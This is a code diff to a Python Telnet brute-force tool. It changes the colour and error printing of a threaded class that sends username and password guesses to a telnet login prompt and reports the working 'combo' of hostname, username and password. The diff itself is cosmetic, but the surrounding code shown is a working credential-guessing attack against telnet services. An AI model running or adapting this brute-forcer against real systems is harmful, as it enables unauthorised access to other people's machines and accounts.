@@ -1,15 +1,8 @@
-# Python Script for Telnet Brute Force
-
-# Importing Module
 import os
 import socket
 import telnetlib
 import threading
-from colorama import init, Fore
-
-init()
-GREEN = Fore.GREEN
-RESET = Fore.RESET
+from .misc import *
 
 
 class TelnetBrute(threading.Thread):
@@ -24,31 +17,31 @@ class TelnetBrute(threading.Thread):
         try:
             client.read_until(b"login: ")
         except EOFError:
-            print("Error: Read(login) failed")
+            print(print_red("[!] Error: Read(login) failed"))
 
         try:
             client.write(username.encode('ascii') + b"\n")
         except socket.error:
-            print("Error: Write(username) failed")
+            print(print_red("[!] Error: Write(username) failed"))
 
         if password:
             try:
                 client.read_until(b"Password: ")
             except EOFError:
-                print("Error: Read(password) failed")
+                print(print_red("[!] Error: Read(password) failed"))
 
             try:
                 client.write(password.encode('ascii') + b"\n")
             except socket.error:
-                print("Error: Write(password) failed")
+                print(print_red("[!] Error: Write(password) failed"))
 
             try:
                 (i, obj, byt) = client.expect([b'incorrect', b'@'], 2)
             except EOFError:
-                print("Error occurred")
+                print(print_red("[!] Error occurred"))
 
             if i == 1:
-                print(f"{GREEN}\n[TELNET] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
+                print(print_green(f"\n[TELNET] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}"))
                 return True
             else:
                 # print(f"\n[TELNET] Invalid credentials for {username}:{password}")
